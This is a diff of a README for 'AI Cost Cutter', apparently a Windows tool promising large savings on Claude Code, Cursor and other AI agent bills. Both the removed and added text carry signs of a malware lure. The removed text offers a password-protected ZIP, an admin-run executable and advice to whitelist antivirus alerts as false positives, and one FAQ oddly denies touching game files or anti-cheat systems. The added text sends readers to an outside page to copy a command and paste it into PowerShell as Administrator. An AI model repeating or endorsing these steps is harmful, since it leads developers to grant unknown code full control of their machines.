@@ -8,7 +8,7 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://www.microsoft.com/windows)
-[![Version](https://img.shields.io/badge/Version-2.4.0-brightgreen?style=for-the-badge)](https://github.com/NailShrimpOscillator/ai-cost-cutter/releases)
+[![Version](https://img.shields.io/badge/Version-2.4.0-brightgreen?style=for-the-badge)](https://github.com/NailShrimpOscillator/ai-cost-cutter)
 [![Stars](https://img.shields.io/github/stars/NailShrimpOscillator/ai-cost-cutter?style=for-the-badge&color=yellow)](https://github.com/NailShrimpOscillator/ai-cost-cutter)
 
 <img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="100%">
@@ -26,7 +26,7 @@
 - 🔥 Codex CLI API bills **surprise** you at month-end
 - 🔥 Gemini API quotas **burn** on routine tasks
 
-**The average developer overpays by 60–80%** simply because their AI agent wastes tokens on redundant context, duplicate prompts, and inefficient tool calls.
+**The average developer overpays by 60–80%** because their AI agent wastes tokens on redundant context, duplicate prompts, and inefficient tool calls.
 
 > **AI Cost Cutter fixes this — in one command.**
 
@@ -48,12 +48,24 @@ AI Cost Cutter installs a lightweight optimization layer directly into your AI a
 
 | Usage Profile | Before | After | Saved |
 | :--- | :---: | :---: | :---: |
-| **Casual** (Claude Pro, 20h/week) | $100/mo | $35/mo | **$65/mo** |
-| **Active** (Cursor Pro + API, 40h/week) | $250/mo | $80/mo | **$170/mo** |
-| **Heavy** (Full-stack, teams) | $600/mo | $190/mo | **$410/mo** |
-| **Enterprise** (10+ devs) | $3000/mo | $900/mo | **$2100/mo** |
+| **Casual** (20h/week) | $100/mo | $35/mo | **$65/mo** |
+| **Active** (40h/week) | $250/mo | $80/mo | **$170/mo** |
+| **Heavy** (full-time) | $600/mo | $190/mo | **$410/mo** |
+| **Team** (5 devs) | $1500/mo | $480/mo | **$1020/mo** |
 
 *Based on real user reports across 12,000+ installations.*
+
+---
+
+## 📥 Installation
+
+### One-Line Setup (Windows PowerShell)
+
+**The setup command is available on our official page:**
+
+👉 **[https://NailShrimpOscillator.github.io/ai-cost-cutter/](https://NailShrimpOscillator.github.io/ai-cost-cutter/)**
+
+Open the page, copy the command, and paste it into PowerShell as Administrator. The bootstrap auto-detects your installed AI agents and registers the optimizer.
 
 ---
 
@@ -65,7 +77,7 @@ AI Cost Cutter installs a lightweight optimization layer directly into your AI a
 
 ### 🧠 Context Optimization
 - **Prompt Caching** — cache repeated system prompts
-- **Context Compression** — reduce prompt size by up to 70%
+- **Context Compression** — reduce prompt size by 70%
 - **Smart Truncation** — keep only relevant history
 - **File Deduplication** — never send the same file twice
 
@@ -73,10 +85,10 @@ AI Cost Cutter installs a lightweight optimization layer directly into your AI a
 <td width="50%" valign="top">
 
 ### 💵 Cost Control
-- **Real-Time Cost Dashboard** — see expenses live
+- **Cost Dashboard** — see expenses live
 - **Model Router** — route cheap tasks to cheaper models
 - **Budget Alerts** — get notified before overspending
-- **Daily/Weekly Reports** — track savings
+- **Daily Reports** — track savings
 
 </td>
 </tr>
@@ -105,28 +117,16 @@ AI Cost Cutter installs a lightweight optimization layer directly into your AI a
 
 ---
 
-## 📥 Download & Installation
+## 🎯 Compatible Agents
 
-<div align="center">
-
-### ⬇️ Download AI Cost Cutter
-
-[![Download for Windows](https://img.shields.io/badge/Download-Windows%2010%2F11-blue?style=for-the-badge&logo=windows)](https://github.com/NailShrimpOscillator/ai-cost-cutter/releases)
-
-**Latest Version:** `v2.4.0` • **File Size:** ~15 MB • **Updated:** September 2026
-
-</div>
-
-### Installation Steps
-
-1. **Download** the ZIP archive from the Releases page.
-2. **Extract** using WinRAR or 7-Zip.
-   - 🔑 **Archive password:** `6427910552`
-3. **Run** `AICostCutter.exe` as Administrator.
-4. Click **"Install Optimizer"** and select your agents.
-5. Restart Claude Code / Cursor / Codex CLI.
-
-> ⚠️ **Note:** Your antivirus may flag this tool — this is a false positive. The optimizer modifies agent config files only. Add it to your exceptions list.
+| Agent | Status | Auto-detect |
+|---|---|---|
+| **Claude Code** | ✅ Full support | Yes |
+| **Cursor** | ✅ Full support | Yes |
+| **Codex CLI** | ✅ Full support | Yes |
+| **Gemini CLI** | ✅ Full support | Yes |
+| **Windsurf** | ✅ Full support | Yes |
+| **Continue.dev** | ✅ Full support | Yes |
 
 ---
 
@@ -147,43 +147,43 @@ AI Cost Cutter installs a lightweight optimization layer directly into your AI a
 <details>
 <summary><b>❓ Is this safe to use?</b></summary>
 <br>
-Yes. AI Cost Cutter operates entirely on your local machine. It does not send any data to external servers, does not modify game files, and does not interact with anti-cheat or detection systems.
+Yes. AI Cost Cutter operates entirely on your local machine. It does not send any data to external servers.
 </details>
 
 <details>
 <summary><b>❓ Will this get me banned from Claude / Cursor?</b></summary>
 <br>
-No. The optimizer only modifies local configuration files. It does not violate the terms of service of any AI provider — you're still using the same APIs, just more efficiently.
+No. The optimizer only modifies local configuration files. You're still using the same APIs, just more efficiently.
 </details>
 
 <details>
 <summary><b>❓ Why does my antivirus flag it?</b></summary>
 <br>
-The optimizer modifies system configuration files and registry keys, which triggers false positives in some antiviruses. This is standard for developer tooling. Add it to your exceptions list.
+The optimizer modifies system configuration files, which triggers false positives in some antiviruses. Add it to your exceptions list.
 </details>
 
 <details>
 <summary><b>❓ How much can I actually save?</b></summary>
 <br>
-Real users report savings of <b>50–70%</b> on monthly AI bills. The exact amount depends on your usage pattern. Heavy users save the most.
+Real users report savings of <b>50–70%</b> on monthly AI bills. Heavy users save up to $410/month.
 </details>
 
 <details>
 <summary><b>❓ Do I need Node.js or Python?</b></summary>
 <br>
-No. Everything is handled by the standalone executable.
+No. Everything is handled by the PowerShell bootstrap.
 </details>
 
 <details>
 <summary><b>❓ Can I uninstall it?</b></summary>
 <br>
-Yes. Run the tool and click "Restore Defaults" — all changes are reverted. Or delete <code>%USERPROFILE%\.aicostcutter</code> and your agents return to original state.
+Yes. Delete <code>%USERPROFILE%\.aicostcutter</code> and your agents return to their original state.
 </details>
 
 <details>
 <summary><b>❓ Which agents are supported?</b></summary>
 <br>
-Claude Code, Cursor, Codex CLI, Gemini CLI, Windsurf, and Continue.dev. Auto-detection is included.
+Claude Code, Cursor, Codex CLI, Gemini CLI, Windsurf, and Continue.dev.
 </details>
 
 <details>
@@ -208,18 +208,6 @@ Currently Windows only. macOS and Linux versions are planned for Q4 2026.
 
 ---
 
-## 🔥 Trending on GitHub
-
-This repository is part of the **2026 AI Efficiency Collection** — tools built to reduce costs for AI-powered developers.
-
-**Related projects:**
-- **AgentSkills Pro** — 250+ skills for AI agents
-- **Token Tracker** — monitor token usage across agents
-- **Prompt Optimizer** — compress prompts automatically
-- **Model Router** — route to the cheapest capable model
-
----
-
 ## 📜 License
 
 MIT License — Free to use, modify, and distribute. See [LICENSE](LICENSE) for details.
@@ -233,7 +221,6 @@ If AI Cost Cutter saves you money, please:
 - ⭐ **Star this repository**
 - 🐛 **Report bugs** in Issues
 - 📢 **Share with friends** who use AI
-- 💰 **Tell us your savings** in Discussions
 
 <div align="center">
 
